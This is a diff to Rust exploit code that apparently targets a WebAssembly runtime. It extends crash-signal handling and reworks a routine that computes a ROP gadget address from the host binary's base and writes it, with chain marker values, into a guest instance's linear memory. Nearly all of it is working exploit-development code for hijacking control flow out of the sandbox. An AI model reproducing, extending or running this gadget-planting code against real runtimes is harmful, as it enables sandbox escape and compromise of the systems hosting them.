@@ -206,6 +206,8 @@ fn install_ws_handlers() {
         libc::sigemptyset(&mut sa.sa_mask);
         libc::sigaction(libc::SIGSEGV, &sa, core::ptr::null_mut());
         libc::sigaction(libc::SIGBUS, &sa, core::ptr::null_mut());
+        libc::sigaction(libc::SIGILL, &sa, core::ptr::null_mut());
+        libc::sigaction(libc::SIGFPE, &sa, core::ptr::null_mut());
     }
 }
 
@@ -580,20 +582,23 @@ fn nested(
     if let Some(goff) = gadget_off {
         let base = find_binary_base();
         gadget_addr = base + goff;
-        if let Ok(mem) = instance_b.exports.get_memory("memory") {
-            let view = mem.view(&store_b);
-            let mut vals: Vec<u8> = Vec::with_capacity(16 * 8);
-            vals.extend_from_slice(&gadget_addr.to_le_bytes()); // slot 0 = gadget
-            for _ in 0..15 {
-                vals.extend_from_slice(&marker.to_le_bytes()); // slots 1..15 = chain value
+        match instance_b.exports.get_memory("memory") {
+            Ok(mem) => {
+                let view = mem.view(&store_b);
+                let mut vals: Vec<u8> = Vec::with_capacity(16 * 8);
+                vals.extend_from_slice(&gadget_addr.to_le_bytes()); // slot 0 = gadget
+                for _ in 0..15 {
+                    vals.extend_from_slice(&marker.to_le_bytes()); // slots 1..15 = chain value
+                }
+                match view.write(64, &vals) {
+                    Ok(_) => eprintln!(
+                        "NESTED planted gadget=0x{:x} marker=0x{:x} (base=0x{:x} off=0x{:x})",
+                        gadget_addr, marker, base, goff
+                    ),
+                    Err(e) => eprintln!("NESTED plant write failed: {:?}", e),
+                }
             }
-            match view.write(64, &vals) {
-                Ok(_) => eprintln!(
-                    "NESTED planted gadget=0x{:x} marker=0x{:x} (base=0x{:x} off=0x{:x})",
-                    gadget_addr, marker, base, goff
-                ),
-                Err(e) => eprintln!("NESTED plant failed: {:?}", e),
-            }
+            Err(e) => eprintln!("NESTED plant: no exported memory: {:?}", e),
         }
     }
 
